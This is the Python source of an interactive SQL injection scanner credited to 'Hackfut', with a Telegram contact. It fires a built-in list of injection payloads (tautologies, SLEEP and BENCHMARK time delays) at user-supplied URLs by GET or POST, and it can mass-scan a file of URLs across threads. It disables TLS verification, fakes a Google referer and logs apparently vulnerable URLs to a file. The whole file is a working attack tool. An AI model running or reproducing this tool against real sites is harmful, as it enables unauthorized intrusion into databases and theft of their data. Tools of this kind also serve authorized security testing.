import os
import requests
from colorama import Fore, init
import concurrent.futures
from urllib.parse import urlparse
from tqdm import tqdm
import logging
import json
import datetime

# Initialize Colorama
init(autoreset=True)

# Define colors
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

# Configure logging
logging.basicConfig(filename='sql_injection_tool.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Disable SSL warnings
requests.urllib3.disable_warnings()

# HTTP request headers
headers = {
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
    "referer": "www.google.com"
}

# Default payloads
DEFAULT_PAYLOADS = [
    "' ",
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 1=1#",
    '" OR 1=1#',
    "' OR '1'='1'--",
    '" OR "1"="1"--',
    "' OR '1'='1'#",
    '" OR "1"="1"#',
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(10000000,MD5('test'))--",
]

# Function to clear the screen
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Function to display the menu
def show_menu():
    clear_screen()
    print(fc + """
   =======================================
   === SQL Injection Testing Tool      ===
   === Author : Hackfut                ===
   === Contact : t.me/H4ckfutSec       ===
   🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛 🅢🅠🅛
   =======================================\n
    1. single URL
    2. file of URLs
    3. Exit
    """)
    choice = input(fg + "[] Choose an option (1/2/3): ")
    return choice

# Function to check if a URL is valid
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])  # Check if the URL has a scheme (http/https) and a domain
    except ValueError:
        return False

# Function to load payloads from a file
def load_payloads_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(fr + "\n[!] Payload file not found.")
        return None

# Function to test SQL injection (GET)
def test_sql_injection_get(url, param, payload):
    try:
        params = {param: payload}
        response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
        
        # Detect SQL errors in the response
        sql_errors = [
            "SQL syntax", "MySQL", "error in your SQL syntax", "ORA-01756", "Unclosed quotation mark",
            "Microsoft OLE DB Provider for SQL Server", "ODBC Microsoft Access Driver", "JET Database",
            "mysql_fetch_array()", "Syntax error", "mysql_numrows()", "mysql_fetch_object()"
        ]
        if any(error in response.text for error in sql_errors):
            generate_report(url, payload, response, "GET")
            return True, response.url
    except requests.RequestException as e:
        logging.error(f"\n[] Error during GET request to {url}: {e}")
    return False, None

# Function to test SQL injection (POST)
def test_sql_injection_post(url, data, payload):
    try:
        data_injected = {key: payload for key in data.keys()}
        response = requests.post(url, data=data_injected, headers=headers, timeout=10, verify=False)
        
        sql_errors = [
            "SQL syntax", "MySQL", "error in your SQL syntax", "ORA-01756", "Unclosed quotation mark",
            "Microsoft OLE DB Provider for SQL Server", "ODBC Microsoft Access Driver", "JET Database",
            "mysql_fetch_array()", "Syntax error", "mysql_numrows()", "mysql_fetch_object()"
        ]
        if any(error in response.text for error in sql_errors):
            generate_report(url, payload, response, "POST")
            return True, response.url
    except requests.RequestException as e:
        logging.error(f"\n[] Error during POST request to {url}: {e}")
    return False, None

# Function to generate a report
def generate_report(url, payload, response, method):
    report = {
        "url": url,
        "payload": payload,
        "method": method,
        "response": response.text[:500],  # Limit response size to avoid large files
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open("report.json", "a") as report_file:
        json.dump(report, report_file)
        report_file.write("\n")

# Function to test a file of URLs
def test_file(file_path, param, payloads, method="GET"):
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url in urls:
                if not is_valid_url(url):
                    logging.error(f"\n[] Invalid URL: {url}")
                    continue
                for payload in payloads:
                    if method == "GET":
                        futures.append(executor.submit(test_sql_injection_get, url, param, payload))
                    elif method == "POST":
                        futures.append(executor.submit(test_sql_injection_post, url, param, payload))
            
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="[] Progress"):
                try:
                    vulnerable, vuln_url = future.result()
                    if vulnerable:
                        print(fg + f"\n[!] SQL vulnerability detected: {vuln_url}")
                        with open("vuln_urls.txt", "a") as vuln_file:
                            vuln_file.write(vuln_url + "\n")
                except Exception as e:
                    logging.error(f"\n[] Error during testing: {e}")
    except FileNotFoundError:
        print(fr + "\n[!] File not found.")

# Main function
def main():
    while True:
        choice = show_menu()
        
        if choice == "1":
            url = input(fc + "\n[] Enter the URL: ")
            if not is_valid_url(url):
                print(fr + "\n[!] Invalid URL.")
                continue
            param = input(fc + "\n[] Enter the parameter to test (e.g., 'id'): ")
            method = input(fc + "\n[] Choose Method []\n\n[1] GET \n[2] POST \n\n[] <<-- (1/2): ")
            payload_choice = input(fc + "\n[1] Use default payloads \n[2] load from a file \n\n[] <<-- (1/2) ")
            if payload_choice == "1":
                payloads = DEFAULT_PAYLOADS
            elif payload_choice == "2":
                payload_file = input(fc + "\n[] Enter the path to the payload file: ")
                payloads = load_payloads_from_file(payload_file)
                if not payloads:
                    continue
            else:
                print(fr + "\n[!] Invalid choice.")
                continue
            
            if method == "1":
                for payload in payloads:
                    vulnerable, vuln_url = test_sql_injection_get(url, param, payload)
                    if vulnerable:
                        print(fg + f"\n[!] SQL vulnerability detected: {vuln_url}")
                        break
                else:
                    print(fr + "\n[!] No SQL vulnerability detected.")
            elif method == "2":
                for payload in payloads:
                    vulnerable, vuln_url = test_sql_injection_post(url, {param: ""}, payload)
                    if vulnerable:
                        print(fg + f"\n[!] SQL vulnerability detected: {vuln_url}")
                        break
                else:
                    print(fr + "\n[!] No SQL vulnerability detected.")
            else:
                print(fr + "\n[!] Invalid choice.")
        
        elif choice == "2":
            file_path = input(fc + "\n[] Enter the path to the file containing URLs: ")
            param = input(fc + "\n[] Enter the parameter to test (e.g., 'id'): ")
            method = input(fc + "\n[] Choose Method []\n\n[1] GET \n[2] POST \n\n[] <<-- (1/2): ")
            payload_choice = input(fc + "\n[1] Use default payloads \n[2] load from a file \n\n[] <<-- (1/2): ")
            if payload_choice == "1":
                payloads = DEFAULT_PAYLOADS
            elif payload_choice == "2":
                payload_file = input(fc + "\n[] Enter the path to the payload file: ")
                payloads = load_payloads_from_file(payload_file)
                if not payloads:
                    continue
            else:
                print(fr + "\n[!] Invalid choice.")
                continue
            
            test_file(file_path, param, payloads, "GET" if method == "1" else "POST")
        
        elif choice == "3":
            print(fg + "\n[*] Exiting the program.")
            break
        
        else:
            print(fr + "\n[!] Invalid choice. Please choose a valid option.")

if __name__ == "__main__":
    main()